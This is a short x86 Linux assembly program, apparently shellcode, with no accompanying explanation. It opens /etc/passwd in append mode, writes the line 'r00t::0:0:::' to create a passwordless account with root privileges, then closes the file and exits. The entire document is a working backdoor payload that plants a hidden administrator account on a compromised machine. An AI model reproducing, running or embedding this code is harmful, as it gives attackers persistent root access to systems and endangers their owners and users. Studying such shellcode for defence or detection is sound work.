section .text
     global _start

_start:

 ; open("/etc//passwd", O_WRONLY | O_APPEND)

       push byte 5
       pop edi
       mov eax, edi
       xor ecx, ecx
       push ecx
       push 0x64777373
       push 0x61702f2f
       push 0x6374652f
       mov ebx, esp
       mov cx, 02001Q
       int 0x80

       mov ebx, eax

  ; write(ebx, "r00t::0:0:::", 12)

       dec edi
       mov eax, edi
       xor edx, edx
       push edx
       push 0x3a3a3a30
       push 0x3a303a3a
       push 0x74303072
       mov ecx, esp
       push byte 12
       pop edx
       int 0x80

  ; close(ebx)

       inc edi
       inc edi
       xchg eax, edi
       int 0x80

  ; exit()

       push byte 1
       pop eax
       int 0x80
